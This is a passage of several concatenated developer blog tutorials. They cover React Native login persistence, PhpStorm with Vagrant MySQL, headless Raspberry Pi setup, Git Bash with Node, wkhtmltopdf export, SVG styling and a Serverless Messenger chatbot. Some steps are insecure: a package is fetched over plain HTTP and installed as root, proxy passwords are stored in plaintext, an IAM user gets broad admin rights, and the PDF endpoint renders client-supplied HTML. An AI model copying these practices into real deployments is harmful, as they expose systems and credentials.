    AsyncStorage.getItem('id_token').then((token) => {
      this.setState({ hasToken: token !== null })
    })
  }

  render() {
    return(
      <Router>
        <Scene key='root'>
          <Scene
            component={Authentication}
            initial={!this.state.hasToken}
            (...)
          />
          <Scene
            component={HomePage}
            initial={this.state.hasToken}
            (...)
          />
        </Scene>
      </Router>
    )
  }
}

There are three reasons why this approach doesn’t work:

the access to the AsyncStorage is asynchronous, so the render method is executed before the state is set
the componentWillMount method doesn’t trigger a re-rendering if the state changes
even if the component re-rendered, once the Router is instantiated, the initial property will not be updated

Thus we must find a way to wait for the token’s existence verification to finish before returning the Router on the render method.
To solve this problem, a loader will be returned by default on the render method. Once the token verification is finished, a 2nd state variable isLoaded will tell the render method to return the Router with the calculated value for the initial scene:
// app/index.js

import {ActivityIndicator, AsyncStorage} from 'react-native';

class App extends Component {

  constructor() {
    super();
    this.state = { hasToken: false, isLoaded: false };
  }

  componentDidMount() {
    AsyncStorage.getItem('id_token').then((token) => {
      this.setState({ hasToken: token !== null, isLoaded: true })
    });
  }

  render() {
    if (!this.state.isLoaded) {
      return (
        <ActivityIndicator />
      )
    } else {
      return(
        <Router>
          <Scene key='root'>
            <Scene
              component={Authentication}
              initial={!this.state.hasToken}
              (...)
            />
            <Scene
              component={HomePage}
              initial={this.state.hasToken}
              (...)
            />
            </Scene>
        </Router>
      )
    }
  }
}

Conclusion
In this article we’ve seen how to:

share a common codebase to build our Android and iOS apps;
set up routes and scenes with react-native-router-flux;
communicate to an API to set up a simple JWT authentication system;
save and retrieve elements from the AsyncStorage;
create a persistent user session *

* It’s worth noting that a new authentication will be required once the token expires because there is no token renewal method.
If you have any questions or comments, please drop a line in the comments area below and I’ll be glad to answer!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fernando Beck
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
Why should I care?
How many hours have you spent logged on your Vagrant trying to type your query, copying in a text editor, pasting, then raging because the console goes crazy and you have to start all over again?
Well, spend five minutes to follow the next steps and see the pain of manipulating your data disappear!
Step 1:
Open your project in PhpStorm and open the DataSource window:

Click on View -> Tool Windows -> Database
Click on the Database sidebar, click on new -> Datasource -> MySQL
The configuration window will appear

Step 2: configure the ssh tunnel

Open your terminal.
cd ~/path/to/your/project
Display the configuration of your ssh connection with the command vagrant ssh-config
On the configuration window, click on the SSH/SSL tab
Report the host, user and port
Choose the Auth Type “Key pair (OpenSSH)” and report the path of the IdentityFile


Click on the apply and then click on Test Connection, you should see an error message saying you’ve got the wrong user/password combination
Step 3: Set up the database configuration

In PhpStorm :
Click on the General tab of the configuration of your datasource
Fill the credentials, host and port. If you’re using Symfony, you can find it in the parameters.yml file.
Click on Apply
Finally, click on Test Connection

Case 1 -> It works! congratulations you can now manipulate your DB from within your IDE
Case 2 -> You get a wrong user/password combination error. Don’t panic! just do the following:

SSH into your Vagrant: vagrant ssh
Change to root user sudo su
Log as root user to your MySQL DB: mysql -uroot
Run the following queries (don’t forget to replace yourdatabase, youruser and your_password):
GRANT ALL PRIVILEGES ON your_database.* TO 'your_user'@'127.0.0.1' identified by 'your_password';
FLUSH PRIVILEGES;
You now have granted your user to login to using the host “127.0.0.1”
You can now go to PhpStorm and test your connection again and it should work!

A few use examples:

Explore the schema of your tables on the sidebar
Open the console file and enjoy:

the autocomplete
the syntactic correction and coloration
write multiple queries and execute the one you want (Ctrl + Enter)
paginated scrollable results
execute multiple queries at the same time, 


Update or add data to your database from the graphical interface.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Quentin Febvre
  			
  				  			
  		
    
			

									"
"
										A Raspberry Pi is a low cost, small single-board computer.
It allows you to develop your own projects and let them run all day on this mini computer.
Possibilities are endless: home automation, Internet of Things,
robotics projects, or run your own router, seedbox, NAS, …
You can also use it as inexpensive project server.
But let’s start from the beginning!
In this article, I will show you how easy it is to install a Raspberry Pi headless
from scratch (meaning that you won’t need another monitor, keyboard,
mouse than the ones of your computer) so you will ‘only’ have to type your code
from your pc and launch your server via ssh.
If you don’t own a Raspberry Pi yet, maybe I’ll make you want to buy one!
Prerequisites
Of course this tutorial require some stuff to work with:

A Raspberry Pi, obviously
An ethernet cable
A battery
An SD card
Your computer

This can all be bought for around 50-80€ on amazon or thePihut.
Install raspbian on your SD card
As any computer, your Raspberry Pi will need an operating system to work with.
First, download Raspbian on their official page.
Raspbian is a free OS based on Debian optimized for the Raspberry Pi architecture.
It contains the set of basic programs and utilities that make your Raspberry Pi run.
Plug your SD card and find the disk where it is mount on your computer with
diskutil list with macOS or df -h on Linux.
Unmount the disk and copy the OS on your SD card.
For Mac:
diskutil unmountDisk /dev/<disk where your SD card is mounted>

or, for Linux:
umount /dev/sdd1

Then write the image to the card with
sudo dd bs=1m if=<your .img file> of=/dev/rdisk<disk where your SD card is mount>

Raspbian is now your Raspberry Pi new OS!
Raspberry Pi doesn’t have ssh activated by default.
You can (and should) authorize ssh by adding an empty file named ssh at boot directory
cd <SD card directory> && touch ssh

First connection
Now, let’s connect to your Raspberry Pi for the first time.
First, you will need to find your Raspberry Pi ip.
Find your computer ip address on the network and the subnet mask with
ifconfig | grep 'inet '

This will display your network interfaces ips (which should look like ‘192.168…..’) and netmasks (for example if your netmask is 0xffffff00 your subnet mask is 24).
Then find your Raspberry Pi ip
sudo nmap -sP <Computer IP address>/<Subnet mask> | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'

This will return the ip of your Raspberry Pi by checking all ip addresses of your local network, find the one of your Pi, and print it.
You can now connect with ssh to your Pi:
The initial user is Pi and the password is raspberry:
ssh pi@<IP>

You can edit your default configuration with raspi-config:

On your first connection, you should also upgrade your packages with
sudo apt update
sudo apt dist-upgrade

and modify your root password with sudo passwd
Authorize your ssh key to connect without password
If you don’t want to fill your password each time you connect to your Pi, you can authorize your ssh key.
Follow this great github tutorial to generate a ssh key if needed.
Then log to your Pi and create a .ssh directory on your Pi if it doesn’t exist
sudo su
cd ~
install -d -m 700 ~/.ssh
touch ~/.ssh/authorized_keys

Then add your public key (on your computer at ~/.ssh/id_rsa.pub) to your Raspberry Pi at the end of ~/.ssh/authorized_keys
Your first server on a Raspberry Pi
It’s all set!
Now let’s try your newly configurated Raspberry Pi with a minimal project to see if
everything works fine.
Let’s try it with a NodeJS server.
First install NodeJS:
wget http://node-arm.herokuapp.com/node_latest_armhf.deb
sudo dpkg -i node_latest_armhf.deb

Create a file server.js with those lines
var http = require('http');

var server = http.createServer(function (request, response) {
  response.writeHead(200, {""Content-Type"": ""text/plain""});
  response.end(""Hello World\n"");
});

server.listen(3000);

Run it with node server.js and go to http://\<IP>:3000/
You should be able to access to your first server hosted on a Raspberry Pi on your
local network.

Develop from your host machine
It’s all very nice, but you will obviously not be working in ssh for a substantial project.
To work from your computer, you will need to mount your distant directory on your computer.
Luckily, this can easily be done with SSHFS.
SSHFS (or Secure shell file system) lets you share a file system securely using
SSH’s SFTP protocol.
SSHFS is based on the FUSE file system that allows a user with no privileges to access a file system without having to modify the kernel sources.
No more theory, let’s practice.
First, install SSHFS and FUSE (if you use a Mac, go to https://osxfuse.github.io/,
on Ubuntu/Debian sudo apt-get install sshfs).
Then, create a directory on your computer and mount your Raspberry Pi project
directory on it with SSHFS
mkdir pi
sshfs root@<IP>:<Path of your project on your Pi> pi
cd pi

You can now access your project directory directly from your computer and modify your files.
Don’t forget to unmount the project when you are done:
umount tmp

Conclusion
You’ve just learnt how to configure a Raspberry PI from scratch headlessly, if you’re
interesting on the project stay tuned for next article about how to use it for home automation !


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Guillaume Renouvin
  			
  				Full Stack developer at Theodo  			
  		
    
			

									"
"
										If you are used to develop on Linux and you have to suddenly switch back to Windows for a particular project, it can be really painful to use native tools like putty or power shell to develop.
Don’t worry, there are plenty of solutions to make things right.
For example, you could work on a Linux virtual machine inside your Windows.
Another solution (the one I chose) is to use Git Bash.
This setup has several advantages:

It requires no installation, which means it can be set up without admin rights
It is rather lightweight and easily packageable
You still have access to your windows filesystem via your command line

We are going to configure and package nodejs/npm inside the Git Bash to share it with every developers of your new team.
Get the softwares
First, get the desired softwares and add these to C:\Applications\ (where you will have sufficient rights to execute them):

Download Git for Windows Portable (“thumbdrive edition”) > HERE < and install it (ex: in C:\Applications\git)
Download node with npm zip package > HERE < and unzip it (ex: in C:\Applications\node)

Git portable edition comes with Git Bash included.
You should now have a folder which looks like this :
Applications
├─ git
│  ├─ git_bash.exe
│  └─ etc
│     ├─ profile (edited)
│     └─ node_env.conf
└─ node
   ├─ node
   └─ npm

Configure your shell
In git Bash, a Linux like environement is simulated so you can access your Linux filesystem with Linux style paths.
For example, to print the content of C:\Applications\ you can type:
ls /c/Applications

Open git bash and type the following command:
export PATH=$PATH:/c/Applications/node

Type then node --version and npm --version to check that node and npm are available.
If not, check that you have the npm and node.exe files in C:\Applications\node.
To reproduce this configuration when launching your terminal, you can create a custom configuration file in C:\Applications\git\etc\node_env.conf :
# Include node PATH
PATH=$PATH:/c/Applications/node

Edit your etc/profile git bash file (Windows location: C:\Applications\git\etc\profile) and add the following line just before exporting the PATH:
source ""etc/node_env.conf""

You should then be able to use npm and node out of the box!
For example, if you want to contribute to this planning burndown chart project:
git clone https://github.com/theodo/planning-bdc.git && cd planning-bdc
npm install
npm run watch

And here you go!
Use SSH in your shell
And now how about using SSH to connect to github?
Indeed, Git Bash comes with a lot of features from Linux like grep, find, sed, and even ssh and scp!
To create a SSH key:
ssh-keygen -t rsa -b 4096 -C ""your_email@example.com""
As in Linux, the key file location will be in ~/.ssh:
cat $HOME/.ssh/id_rsa.pub
Add it to Github and run:
git clone git@github.com:theodo/planning-bdc.git && cd planning-bdc
npm install
npm run watch

And here you go again!
Set up your proxies (optional)
If you get stuck when using git clone or npm install, you may be blocked by a proxy (which requires configuration as well). Find out what the address is following this process.
Add the following lines to your node_env.conf :

if [ -f ""etc/node_env.var"" ];
then
  source ""etc/node_env.var""
else
  touch etc/node_env.var

  read -p ""What is your proxy login? "" PROXY_LOGIN
  echo ""PROXY_LOGIN=\""${PROXY_LOGIN}\"""" >> etc/node_env.var

  read -p ""What is your proxy password? "" PROXY_PASSWORD
  echo ""PROXY_PASSWORD=\""${PROXY_PASSWORD}\"""" >> etc/node_env.var

  PROXY_ADDRESS=""proxy.address.com""
  echo ""PROXY_ADDRESS=\""${PROXY_ADDRESS}\"""" >> etc/node_env.var

  PROXY_PORT=""8080""
  echo ""PROXY_PORT=\""${PROXY_PORT}\"""" >> etc/node_env.var
fi

# Used for Node Terminal proxy (for packages as shipit)
export HTTP_PROXY=http://${PROXY_LOGIN}:${PROXY_PASSWORD}@${PROXY_ADDRESS}:${PROXY_PORT}
export HTTPS_PROXY=https://${PROXY_LOGIN}:${PROXY_PASSWORD}@${PROXY_ADDRESS}:${PROXY_PORT}
# Npm proxy
npm config set proxy $HTTP_PROXY
npm config set https-proxy $HTTPS_PROXY
# Git proxy
git config --global http.proxy $HTTP_PROXY
git config --global https.proxy $HTTPS_PROXY

This piece of bash code will :

Check if a node_env.var file exists
If true, it will import it
If false, it will create it and fill it with the PROXY_LOGIN, PROXY_PASSWORD, PROXY_ADDRESS and PROXY_PORT variables
Then it will configure your node, npm and git with the proxy

Be careful with your HTTPS proxy, it might have a different address / port than your http proxy
Start your Git Bash and you should be asked for the proxy variables. You should now be able to use git clone and npm install for your applications!
You can also use the integrated ssh client.
If you need to change the variables, destroy the node_env.var file and you will be asked for new values.
Conclusion
Now you got a configured and packaged Git Bash, you can adapt it to create your own environement!
Thanks for reading, don’t hesitate to leave feedback!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Ngô-Maï
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Have you ever tried to generate a pdf in your application? This year, I have. Twice.
I’m sure there are several means to this end. For example, one of my colleagues used phantomjs and then wrote an article about his experience. But if I’m here now, it’s to tell you my story with wkhtmltopdf.
It all started in February when my client requested a feature that would allow him to print any page of the application we were building. When we started, we didn’t know how to do it and we tried different tools. Some of these tools had issues with our NVD3 charts, others were incompatible with our security requirements.
Then we discovered wkhtmltopdf!

The proof of concept
The way to use wkhtmltopdf is really simple:

Take the html and give it to wkhtmltopdf
Take the pdf and give it to the user
Take a beer and give me one

But first of all you should know two or three things:

Wkhtmltopdf has dependencies. On Linux, I had to install zlib, fontconfig, freetype, and X11 libs
Wkhtmltopdf’s current stable release is 0.12.4 and based on Qt 4.8.5 version. This is an old Qt version (used by Google Chrome 18/19/20) that does not support flexbox for example
An alpha release based on Qt 5.4.2 (with an updated browser engine) is available

Now let’s dive into a real-world example! The front-end is based on an AngularJS 1 app.
Take the html and give it to wkhtmltopdf
So first we need a button.
// template.html

<a ng-click=""print()"">Print</a>

Then we send the html to the backend to generate our pdf.
// controller.js

$scope.print = function() { 
  var html = document.getElementsByTagName('html')[0];
  var body = {html: html.outerHTML};
  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'});
}

The best way to use wkhtmltopdf in your backend is to install a wrapper. There are several wrappers, I used the first one I found.
// package.json

{ 
  ""dependencies"": { 
    ""wkhtmltopdf"": ""0.1.5""
  }
}
Don’t forget to install the binary wkhtmltopdf in your project!
// pdf.js

var wkhtmltopdf = require('wkhtmltopdf');
module.exports = function(PDF) {
  PDF.print = function(req, res, done) {
    var html = req.body.html;
    var projectLocation = __dirname + '/../../';
    var CSSLocation = projectLocation + 'client/www/style/' + 'main.css';
    var wkBinPath = projectLocation + 'bin/wkhtmltopdf';
    wkhtmltopdf.command = wkBinPath;
    var options = { 'user-style-sheet': CSSLocation, };
    var stream = wkhtmltopdf(html, options);
    done;
  }
}

Of course, the projectLocation, CSSLocation and wkBinPath depend on the architecture of your project.
Take the pdf and give it to the user
Currently, you still have nothing. But you’ve done the hardest part!
Indeed wkhtmltopdf generated a stream for you. Now you have to send the stream to your frontend.
// pdf.js

    var stream = wkhtmltopdf(html, options);
    res.set('Content-Disposition', 'attachment; filename=transcript.pdf');
    res.set('Content-Type', ""application/pdf"");
    stream.pipe(res);
    done;
And make your user download it.
// controller.js

  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'})
  .success(function(response) { 
    var file = new Blob([ response ], {type: 'application/pdf'});
    FileSaver.saveAs(file, 'print.pdf');
  }
)
You’re going to need to install another dependency, FileSaver:
// bower.json

{ 
  ""dependencies"": {
    ""angular-file-saver"": ""1.1.0""
  }
}
Don’t forget to inject ‘ngFileSaver’ in your module!
Share a drink and look at the result
You might get some issues, like this “size issues”:

And it’s certainly not what you wanted. But this is enough to say: “I can do it!”.
In the next article, we’re going to see how to improve your pdf.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Vincent Langlet
  			
  				Vincent Langlet is an agile web developer at Theodo.  			
  		
    
			

									"
"
										What is the SVG file format and why should I care?
SVG stands for Scalable Vector Graphics.
It is a file format for vectorial images described using XML tags.
Since it is vectorial, it presents a few advantages:

it is lightweight
you can zoom it as much as you want without it getting blurry
you can dynamically modify it (colours, shapes)

Dynamically change your SVG using CSS
The SVG format can be directly included in a HTML document as a DOM element.
Each stroke or shape is an object that can own a class
Knowing this, we can add CSS styles for strokes and shapes, and dynamically modify the objects.
We will use the following SVG file to illustrate our examples (credits to Jean-Rémi Beaudoin for the very nice drawing skills!).

This is the content of the svg file:
<?xml version=""1.0"" encoding=""UTF-8""?>
<svg
   xmlns:svg=""http://www.w3.org/2000/svg""
   xmlns=""http://www.w3.org/2000/svg""
   version=""1.1""
   viewBox=""0 0 100 100""
   height=""100""
   width=""100"">
  <g
     transform=""translate(0,-952.36216)"">
    <path
       d=""m 5,1021.1122 56.071429,-56.96433 -3.75,50.71433 z""
       class=""my-path""
       fill=""#9f9f9f"" />
    <path
       d=""M 96.607142,1036.8265 5,1021.1122 l 52.321429,-6.25 z""
       fill=""#7a7a7a""
       class=""my-path"" />
    <path
       d=""m 96.607142,1036.8265 -35.535713,-72.67863 -3.75,50.71433 z""
       fill=""#e0e0e0""
       class=""my-path"" />
  </g>
</svg>

For example, this will fill every svg path of the image with red:
path {
    fill: #ff0000;
}

See the Pen wgKKMJ by Pierre Poupin (@Pierpo) on CodePen.
You can be more specific.
You can add classes to your SVG elements and select them independently:
.first-element {
    fill: #ff0000;
}
.second-element {
    fill: #00ff00;
}

You can even use the :hover and :active selectors, which is very nice to integrate nice buttons.
See the Pen EZadxE by Pierre Poupin (@Pierpo) on CodePen.
Using external SVG files
Naive approach
Most of the time, you won’t copy and paste your SVG directly in your HTML page.
You naturally want to import your SVG as an image.
The most intuitive way would be to include it this way:
<img src=""my-svg.svg"">

Which totally works for an SVG as it is.
However, including it like this prevents you from interacting with it.
The img field will make your browser import it as a black box, and no operation on anything inside it would be possible.
That means the above CSS examples would not work!
Unfortunately, you will get the same behaviour if you use background-image: 'my-svg.svg'.
One simple way using Twig
Thus, we want the SVG and all its sub-elements to be well determined parts of our DOM as well as our SVG to be an external file.
There’s a very simple way to do it using Twig! Simply use the source function in your template.
{{ source('my-svg.svg') }}

This will copy the text present in the SVG file and put it in your generated HTML, thus make it a proper recursive and editable DOM element.
That’s it!
Resources:

https://css-tricks.com/using-svg/


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre Poupin
  			
  				Developer at Theodo. I live in my terminal. Too lazy to use another editor than Vim.  			
  		
    
			

									"
"
										I always feel guilty when I suddenly motivate myself to go to the gym, then have all the painful thoughts like going out in the cold, being sweaty and feeling stiff afterwards and decide that I’d rather stay in bed watching my favorite series.
I have the same mixed feelings when I get an idea of project and then get discouraged —even before getting started— thinking about having to provision a server and deploy my code to see it live and used by others than myself.
But recently, I discovered Serverless, a framework based on Amazon Lambda that helps you deploy your code in seconds.
The framework is said to relieve Lambda functions of its main pain points (the AWS console, the heavy configuration), to allow developers to work with more familiar standards.
Looks like a really nice promise that would dismiss all my excuses not to go on with any of my ideas:

Focus on coding, deploy single functions in the cloud
Don’t manage any server. AWS handles provisioning and scaling
Pay only when the functions are running

I decided to test it on a fun project and experience how promising it actually is.
I ended up creating a chatbot game on Facebook Messenger, to help my colleagues learn the name of everybody in the company.
I started with this tutorial: Building a Facebook Messenger Chatbot with Serverless, which quickly allowed me play with my phone talking to my chatbot.
But I have to admit I had to struggle a little to fully understand all the magic behind the framework and diverge from the tutorial to do what I wanted.
In this article, you’ll find:

How Serverless works
A benchmark on when to use Serverless, an EC2 or a Heroku server

What cool projects can you do with Serverless?
Lambda functions are handy for:

A cron job running without having a full server dedicated to it
Ex: a custom IFTTT or Zapier
An automatic data processing job
Ex: create thumbnails for profile pictures uploaded to your website

Funnier: a backend for a chatbot
Building a chatbot is a great mean to test an idea and develop an MVP.
The advantage is that you only have to focus on the backend, since the frontend and delivery is granted by the messaging service you’ll be using.
And with Serverless,

Only code the logic of the bot
Quickly iterate as deploying is super fast
Spend little money while testing
Keep focusing on your service if you get successful as AWS handles scaling

Having a Chatbot Running in Prod in 15 Minutes with Serverless
Requirements
Before starting the tutorial, make sure you have:

An account set on AWS ~3min + 24h validation

Be aware that a credit card is required to sign up
You’ll have the free tier for one year
You’ll need to wait 24 hours to have your account validated
Be patient, you can watch your favorite series or go to the gym while you wait 😉


Node v4 or higher to install Serverless ~1min
npm install -g serverless will do the job
The API Key & Secret of an IAM user ~2min
With programmatic access and AdministratorAccess. The paragraph Creating AWS Access Keys in the Serverless doc is fairly explicit for that.
Configured Serverless with your AWS credentials ~1min
I recommend using the serverless config credentials command.
You’ll avoid having to install aws-cli or managing environment variables
For the chatbot, a Facebook Developer account ~1min
3min if you don’t have a Facebook account yet
For the chatbot, a Facebook page that you own ~2min
The page gives an identity to your chatbot, you can’t have one without it.

Tutorial
Init your project
$ sls create --template aws-nodejs --path my-first-chatbot

This creates two files in the directory my-first-chatbot:
├── my-first-chatbot
│   ├── handler.js
│   └── serverless.yml

I used Node.js for my bot. If you prefer Python, use aws-python instead.
First take a look at the serverless.yml file.
It is the configuration file of your project.
Lots of options are commented in the file, all you need for now is the following:
service: my-first-chatbot

provider:
  name: aws
  runtime: nodejs4.3
  region: eu-central-1 # (Frankfort) Choose the closest data center
                       # from your end users

functions:
  hello: # the name of your Lambda function
    handler: handler.hello # The node function that is exported
                           # from the handler.js module
                           # It is used as handler by AWS Lambda
                           # That's to say the code excecuted
                           # when your Lambda runs.

So far you have declared the hello Lambda function which will be deployed somewhere in the Frankfort AWS cloud.
You can already invoke it locally from your shell to check that it works:
$ sls invoke local -f hello
{
    ""statusCode"": 200,
    ""body"": ""{\""message\"":\""Go Serverless v1.0!
         Your function executed successfully!\"",\""input\"":\""\""}""
}

Notice that you can pass an input when you invoke your Lambda function, either inline or with a .json or .yml file
$ sls invoke local -f hello -d ""my data""
{
    ""statusCode"": 200,
    ""body"": ""{\""message\"":\""Go Serverless v1.0!
         Your function executed successfully!\"",\""input\"":\""my data\""}""
}

$ sls invoke local -f hello -p ""path_to_my_data_file.yml""
{
    ""statusCode"": 200,
    ""body"": ""{\""message\"":\""Go Serverless v1.0!
         Your function executed successfully!\"",\""input\"":\""{\""data\"":
         \""Content of my data file as json\""}\""}""
}

Now you can take a look at the handler.js file to see that the hello function simply returns a JSON 200 response.
'use strict';

module.exports.hello = (event, context, callback) => {
  const response = {
    statusCode: 200,
    body: JSON.stringify({
      message: 'Go Serverless v1.0! Your function executed successfully!',
      input: event,
    }),
  };

  callback(null, response);
};


The event variable contains all data from the event that triggered your function.
The context variable contains runtime information of the Lambda function that is executing.
We won’t need it here but if you are curious you can check the documentation about the context object on AWS

Code the logic to communicate with your Facebook chat.
You need a webhook (aka web callback or HTTP push API) to first exchange credentials with your Messenger app so that you can start receiving events from it (incoming messages, postback …) and responding to them.
Credentials exchange is done through an HTTP GET event set for your Lambda function.
The HTTP GET event requires an endpoint.
Luckily, Serverless allows you to create one simply by writing a few lines of configuration.
Rename your hello function to webhook and add the following config to your serverless.yml:
...

functions:
  webhook: # The name of your lambda function
    handler: handler.webhook
    events: # All events that will trigger your webhook Lambda function
      - http:
          path: webook # The path of the endpoint generated with API Gateway
          method: GET
          integration: Lambda # A method of integration to exchange
                              # requests and responses between the
                              # HTTP endpoint and your Lambda function
                              # The `Lambda` method here works well
                              # with Messenger's events

Then update your handler.js file to enable authorisation:
module.exports.webhook = (event, context, callback) => {
  if (event.method === 'GET') {
    // Facebook app verification
    if (
      event.query['hub.verify_token'] === 'SECRET_TOKEN'
      && event.query['hub.challenge']
    ) {
      return callback(null, parseInt(event.query['hub.challenge']));

    } else {
      const response = {
        statusCode: 403,
        body: JSON.stringify({
          message: 'Invalid Token',
          input: event,
        }),
      };

      return callback(null, response);
    }
  } else {
    const response = {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Bad Request',
        input: event,
      }),
    };

    return callback(null, response);
  }
 };


Don’t forget to rename your exported Lambda function webhook!
Make sure to choose a strong SECRET_TOKEN
  It is the token that you will have to declare to your Messenger app to enable communication with the chat
The hub.challenge is an integer code that Messenger sends you along with the token

 Test your handler locally:

  $ sls invoke local -f webhook -p -d ""{\""method\"":\""GET\"",\""query\"":{\""hub.verify_token\"":\""SECRET_TOKEN\"",\""hub.challenge\"":123456}}""
123456
  $ sls invoke local -f webhook -p -d ""{\""method\"":\""GET\"",\""query\"":{\""hub.verify_token\"":\""BAD_TOKEN\"",\""hub.challenge\"":123456}}""
{
    ""statusCode"": 403,
    ""body"": ""{\""message\"":\""Invalid Token\"",\""input\"":{\""method\"":\""GET\"",\""query\"":{\""hub.verify_token\"":\""BAD_TOKEN\"",\""hub.challenge\"":123456}}}""
}

  I recommend you create .yml or .json files to invoke your Lambda function locally.  It will make your life easier 
Now that you’ll be able to receive events from Messenger, let’s update your Lambda function to actually handle them.
Add HTTP POST config to your serverless.yml:
...

functions:
  webhook:
    handler: handler.webhook
  events:
    - http:
      path: webook
      method: GET
      integration: Lambda
    - http:
      path: webook
      method: POST
      integration: Lambda

To handle the POST requests we will need some more preparation:

 Create your Messenger app
 For that,

 Create an app from your Facebook developer account
 Add the Messenger product to your app
   You can access all Facebook products from the left menu “Add a product”


 Get a page token to be able to post messages on behalf of your page (and have your chatbot respond automatically)
 Once you have added Messenger to your app, configure Messenger parameters (accessible from left menu also):

 Under “Token Generation”, select your Facebook page
 Grant access to it with your Facebook account
 Save the token you get for later


 Add axios to your project to be able to send responses from your bot
$ npm install axios


Now you can edit your `handler.js`:
const axios = require('axios');
const fbPageToken = 'YOUR_FACEBOOK_PAGE_TOKEN';
const fbPageUrl = `https://graph.facebook.com/v2.6/me/messages?access_token=${fbPageToken}`;

module.exports.webhook = (event, context, callback) => {
  if (event.method === 'GET') {
    // ...
  } else if (event.method === 'POST' && event.body.entry) {
      event.body.entry.map((entry) => {
        // Messenger can send several entry for one event.
        // The list contains all the information on the event.
        entry.messaging.map((messagingItem) => {
          // Each entry can have several messaging data within each event.
          // For instance if a user sends several messages at the same time.
          // messagingItem contains:
          //  - the sender information,
          //  - the recipient information,
          //  - the message information,
          //  - other specific information
          const senderId = messagingItem.sender.id;

          // handle text message
          if (messagingItem.message && messagingItem.message.text) {
          const payload = {
            recipient: {
              id: senderId
            },
            message: {
              text: `You say ""${messagingItem.message.text}"", I say: Hi, let's chat :)`
            }
          };
          axios
            .post(fbPageUrl, payload)
            .then((response) => {
              response = {
                statusCode: response.status,
                body: JSON.stringify({
                  message: response.statusText,
                  input: event,
                }),
              };
              return callback(null, response);
            })
            .catch((error) => {
              const response = {
                statusCode: error.response.status,
                body: JSON.stringify({
                  message: error.response.statusText,
                  input: event,
                }),
              };
              return callback(null, response);
            });
        }
      });
    });
  } else {
    // ...
  }
 };
You can try to call your Lambda locally, but you won’t be able to get a successful response unless you know a real sender ID.
$ sls invoke local -f webhook -d ""{\""method\"":\""POST\"",\""body\"":{\""entry\"":[{\""messaging\"":[{\""sender\"":{\""id\"":\""YOUR_SENDER_ID\""},\""message\"":{\""text\"":\""Hello\""}}]}]}}""
{
""statusCode"": 400,
""body"": ""{\""message\"":\""Bad Request\"",\""input\"":{\""method\"":\""POST\"",\""body\"":{\""entry\"":[{\""messaging\"":[{\""sender\"":{\""id\"":\""YOUR_SENDER_ID\""},\""message\"":{\""text\"":\""Hello\""}}]}]}}}""
}

This means it is time to deploy your project for the first time!
Deploy
As easy as:
$ sls deploy

You’ll see the following logs appear:
Serverless: Packaging service...
Serverless: Uploading CloudFormation file to S3...
Serverless: Uploading service .zip file to S3 (134.73 KB)...
Serverless: Updating Stack...
Serverless: Checking Stack update progress...
.................................
Serverless: Stack update finished...
Service Information
service: my-first-chatbot
stage: dev
region: eu-central-1
api keys:
  None
endpoints:
  GET - https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook
  POST - https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook
functions:
  my-first-chatbot-dev-webhook: arn:aws:Lambda:eu-central-1:ID:function:my-first-chatbot-dev-webhook

Congratulations, your webhook is now available from anywhere!
What happened exactly?
Notice that you have a new folder in your project directory:
├── my-first-chatbot
│ ├── .serverless
│ │ ├── cloudformation-template-create-stack.json
│ │ ├── cloudformation-template-update-stack.json
│ │ └── my-first-chatbot.zip
│ ├── node_modules
│ ├── handler.js
│ └── serverless.yml

Let’s examine the first half of the logs to understand:

Serverless reads your serverless.yml file to create two CloudFormation files in the directory .serverless:

one to create a CloudFormation on AWS through your AWS account
one to create all the AWS resources you need to have your Lambda function working (here it includes the two API Gateway endpoints you need for your webhook and other credentials settings)


Serverless packaged all the files in your directory except the serverless.yml file, zip it to .serverless/my-first-chatbot.zip
Serverless then uploads the new files created to an S3 Bucket in the region specified in your serverless.yml and creates or update all the resources listed in the CloudFormation update file (including the Lambda function of course)

What you can do now:

Invoke your deployed Lambda function
$ sls invoke -f webhook -p -d ""{\""method\"":\""GET\"",\""query\"":{\""hub.verify_token\"":\""SECRET_TOKEN\"",\""hub.challenge\"":123456}}""
$ sls invoke -f webhook -p -d ""{\""method\"":\""GET\"",\""query\"":{\""hub.verify_token\"":\""BAD_TOKEN\"",\""hub.challenge\"":123456}}""
$ sls invoke -f webhook -d ""{\""method\"":\""POST\"",\""body\"":{\""entry\"":[{\""messaging\"":[{\""sender\"":{\""id\"":\""YOUR_SENDER_ID\""},\""message\"":{\""text\"":\""Hello\""}}]}]}}""


Test that your Lambda function is triggered when there is a call to one of the endpoints that were just created
    Use curl for instance to query the endpoint https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook
Better, test your chatbot live!

Try it! Send your first message to your chatbot
Final settings for your Messenger app:

Configure Messenger parameters to “Setup Webhooks” under “Webhooks” now that your endpoint is available
Use the endpoint url as “Callback URL” and your SECRET_TOKEN
Subscribe to messages and other Messenger events you might want to handle
“Verify and Save”: Facebook will call the GET endpoint with the token your gave him to subscribe your webhook to the app
Once done, in the same “Webhook” section, select your Facebook page for subscription: you’ll now listen to the events incoming from this page

Now for the chatbot to send you automatic messages, you need to start the conversation first (otherwise you’ll get a 403)

If your page is public, find your page in Messenger and send your first message!
If not, go to the Facebook page and start a conversation from there

Your app is now in prod!
You can start iterating. Facebook allows you to grant permission to testers to use your app before it is validated and available by anyone.
Benchmarking MVP options
Pros and cons
I rated Serverless, EC2 and Heroku based on three criteria:




Serverless
EC2
Heroku




Scalability
++
+
–


